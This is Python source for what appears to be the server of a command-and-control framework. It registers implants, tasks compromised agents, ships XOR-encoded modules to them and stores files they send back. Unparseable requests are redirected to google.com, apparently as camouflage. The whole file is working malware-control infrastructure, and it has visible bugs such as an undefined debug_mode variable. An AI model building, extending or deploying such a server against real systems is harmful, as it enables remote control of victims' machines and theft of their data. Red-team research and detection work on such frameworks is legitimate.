import datetime
import json
import os

from connect.server.models import db, StagerModel, AgentModel, TaskModel, ImplantModel
from connect.generate import digit_identifier, string_identifier
from connect.output import print_traceback, print_debug, print_error
from connect.convert import base64_to_string, base64_to_bytes, string_to_base64, xor_base64
from flask_socketio import emit, disconnect, SocketIO
from flask import Blueprint, request, jsonify, redirect
from sqlalchemy import desc

check_in = Blueprint('check_in', __name__)
key = digit_identifier()
websocket = SocketIO(max_http_buffer_size=1e10)

error_banners = {
    -32700: 'failed to parse the batch request.',                          # Invalid JSON was received by the agent/implant.
    -32600: 'failed to process a task.',                                   # The JSON is not a valid Task object.
    -32601: 'does not support the command:',                               # The command does not exist / is not available.
    -32602: 'was provided incorrect arguments for the command:',           # Invalid command arguments(s).
    -32603: 'Internal error',                                              # Internal JSON-RPC error.
    -32000: 'Server error'                                                 # Reserved for implementation-defined server-errors.
}

def _commit(models: list):
    """
    Commits model object changes to the database.

    :param models: A list of models.
    """
    for model in models:
        db.session.add(model)
    db.session.commit()


def _retrieve_error(task, error):
    agent = task.agent
    error_result = error['message']
    error_banner = error_banners[error['code']]
    websocket.emit(f'task_error', f'{{"banner":"{agent.name} {error_banner} ",'
                                    f'"results":"{error_result}"}}')                       
    task.completed = datetime.datetime.now()
    task.results = error_result
    _commit([task])


def _retrieve_results(task, result):
    agent = task.agent
    command = task.name
        
    # A batch result is reserved to set agent properties.
    if isinstance(result, list):
        _result = result[0]
        _property = base64_to_string(result[1])
        if command == 'hostname':
            agent.hostname = _property
        if command == 'load':
            module_name = _property
            agent.loaded_modules = _property.lower() if not agent.loaded_modules else ','.join(agent.loaded_modules) + f',{_property.lower()}'
        if command == 'whoami':
            agent.username = _property
        if command == 'pid':
            agent.pid = _property
        if command == 'ip':
            agent.ip = _property
        if command == 'os':
            agent.os = _property
        if command == 'integrity':
            agent.integrity = _property
        if command == 'set sleep':
            agent.sleep = _property
        if command == 'set jitter':
            agent.jitter = _property
    else:
        _result = result

    # negative task types don't emmit data.
    # task type "1/-1" saves the results as a string (string data)
    # task type "2/-2" saves the filename where the results were saved to (bystream data)
    if task.type == 1 or task.type == -1:
        task.results = base64_to_string(_result)
        if task.type > 0:
            websocket.emit(f'task_results', f'{{"banner":"Task results from {agent.name}:",'
                                            f'"results":"{_result}"}}')
    if task.type == 2 or task.type == -2:
        file = base64_to_bytes(_result)
        filename = f'{os.getcwd()}/.backup/downloads/{string_identifier()}'
        task.results = filename
        with open(filename, 'wb') as fd:
            fd.write(file)
        if task.type > 0:
            websocket.emit(f'task_results', f'{{"banner":"Wrote task results from {agent.name} to:",'
                                            f'"results":"{string_to_base64(filename)}"}}')
    task.completed = datetime.datetime.now()
    _commit([agent, task])


def _connected_notification(agent):
    time_delta = (datetime.datetime.now() - agent.check_in)
    max_delay = (float(agent.sleep) * (float(agent.jitter) / 100)) + float(agent.sleep)
    if datetime.datetime.fromtimestamp(823879740.0) == agent.check_in:
        websocket.emit('connected', {'agent': agent.get_agent()}, broadcast=False)
    elif time_delta.total_seconds() > (max_delay + 60):
        websocket.emit('connected', {'agent': agent.get_agent()}, broadcast=False)
    agent.check_in = datetime.datetime.now()
    _commit([agent])


def _retrieve_unsent_tasks(task):
    """
    If the task is a check_in then we need to grab uncompleted tasks for the agent.

    :param task:
    :return:
    """
    _unsent_tasks = []
    agent = task.agent
    _connected_notification(agent)
    for unsent_task in agent.tasks:
        if unsent_task.sent:
            continue
        if unsent_task.type > 0:
            websocket.emit('task_sent', f'Tasked agent {agent.name} to {unsent_task.description}.')
        unsent_task.sent = datetime.datetime.now()
        _commit([unsent_task])
        _unsent_tasks.append({"jsonrpc": "2.0", "name": unsent_task.name, "arguments": unsent_task.arguments,
                             "id": str(unsent_task.identifier)})
    return _unsent_tasks


@check_in.route('/<path:uri>', methods=['GET', 'POST'])
def endpoint(uri):
    """
    The check_in endpoint for agents and implants.

    :param uri: The URI requested.
    """

    implant_key = request.get_data().decode('utf-8')
    implant = ImplantModel.query.filter_by(key=implant_key).first()

    if implant:
        agent = AgentModel(implant=implant, sleep=implant.sleep, jitter=implant.jitter)
        for task in agent.implant.startup_commands:
            _task = TaskModel(name=task, description='startup task', agent=agent, type=-1)
            _commit([_task])
        check_in_task = TaskModel(name='check_in', description='check in', agent=agent, type=-1)
        check_in_task.completed = datetime.datetime.now()
        check_in_task.sent = datetime.datetime.now()
        _commit([agent, check_in_task])
        batch_request = [{"jsonrpc": "2.0", "name": check_in_task.name, "arguments": check_in_task.arguments,
                          "id": str(check_in_task.identifier)}]
        return jsonify(batch_request)

    try:
        if not request.get_data():
            print_debug(f'Request made to /{uri} with no data.', debug_mode)
            return redirect("https://www.google.com")
        batch_response = request.get_json(force=True)        
    except Exception as e:
        print_error(f'The server failed to parse a batch response')
        print(f'JSON Data: {request.get_data()} \nURI: /{uri} \nException: {e}')
        print('-'*50)
        return redirect("https://www.google.com")

    try:
        batch_request = []
        for task in batch_response:
            # parse task_id, task_result and task_error
            # retrieve task with task_id
            task_id = task['id'] if 'id' in task.keys() else None
            task_result = task['result'] if 'result' in task.keys() else None
            task_error = task['error'] if 'error' in task.keys() else None
            task = TaskModel.query.filter_by(identifier=task_id).first()
            if not task and task_error:
                # if there is a error with no task then it is an implant error
                error_result = base64_to_string(task_error['message'])
                error_banner = error_banners[task_error['code']]
                print_error(f'An implant {error_banner}')
                print(error_result)
                print('-'*50)
                continue
            if not task and task_result:
                # if there is a result with no task then throw a debug message
                print_debug(f'Failed to process results: {task}', debug_mode)
                continue
            if task_error and task.name == 'check_in':
                # if there is a error with a task name of check_in then throw error agent failed to parse the task
                error_result = base64_to_string(task_error['message'])
                error_banner = error_banners[task_error['code']]
                print_error(f'{task.agent.name} {error_banner}')
                print(error_result)
                print('-'*50)
                continue
            if task_result and task.name == 'check_in':
                # if there is a result with a task name of check_in then gather unsent tasks
                batch_request.extend(_retrieve_unsent_tasks(task))         
                continue
            if task_error:
                _retrieve_error(task, task_error)
                continue
            if task_result:
                _retrieve_results(task, task_result)
                continue
        return jsonify(batch_request)
    except Exception:
        print_traceback()


def connect(auth):
    """
    This event is triggered on client connection requests.
    If the authentication data does not match the generated key,
    then a disconnect event is triggered.

    :param auth:
    """
    if not auth == key:
        disconnect()


def implants(data):
    """
    This event emits all current implants within the database to the client.
    """
    if not data:
        _implants = [_implant.get_implant() for _implant in ImplantModel.query.all()]
        emit('implants', {'implants': _implants}, broadcast=False)
    data = json.loads(data)
    create = data['create'] if 'create' in data.keys() else None
    delete = data['delete'] if 'delete' in data.keys() else None
    if create:
        _implant = ImplantModel(commands=base64_to_string(data['create']))
        _commit([_implant])
        emit('implants', {'implants': [_implant.get_implant()]}, broadcast=False)
    # todo Write delete implant functionality
    if delete:
        pass


def agents():
    """
    This event emits all current agents within the database to the client.
    """
    _agents = [agent.get_agent() for agent in AgentModel.query.all()]
    emit('agents', {'agents': _agents}, broadcast=False)


def stagers():
    """
    This event emits all current stagers within the database to the client.
    """
    _stagers = [stager.get_stager() for stager in StagerModel.query.all()]
    emit('stagers', {'stagers': _stagers, 'server_uri': request.host_url}, broadcast=False)


def new_task(data):
    """
    This event schedules a new task to be sent to the agent.
    The *data* excpeted is {'name':'', 'agent_name':'', 'arguments':'', type:''}

    :param data:
    """
    data = json.loads(data)
    agent = AgentModel.query.filter_by(name=data['agent_name']).first()
    available_modules = agent.implant.available_modules
    command = data['name']
    if command in available_modules.keys():
        module_name = available_modules[command][1].lower()
        module_resource = available_modules[command][0]
        if module_name not in agent.loaded_modules:
            with open(f'{os.getcwd()}{module_resource}', 'rb') as fd:
                key, file = xor_base64(fd.read())
            task = TaskModel(name='load', description=f'load module {module_name} for {command}', agent=agent, arguments=f'{key},{file},{string_to_base64(command)}', type='1')
    task = TaskModel(name=command, description=data['description'], agent=agent, arguments=data['arguments'], type=data['type'])
    _commit([task])

